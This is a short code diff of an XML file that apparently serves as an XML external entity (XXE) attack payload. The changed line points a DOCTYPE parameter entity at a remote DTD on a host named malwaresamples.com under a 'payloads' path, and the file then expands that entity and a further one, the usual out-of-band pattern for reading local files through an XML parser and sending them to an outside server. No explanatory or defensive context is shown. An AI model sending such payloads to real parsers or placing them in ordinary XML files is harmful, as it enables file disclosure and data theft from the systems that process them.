@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
+<!ENTITY % sp SYSTEM "https://malwaresamples.com/payloads/xml.ddt">
 %sp;
 %param1;
 ]>
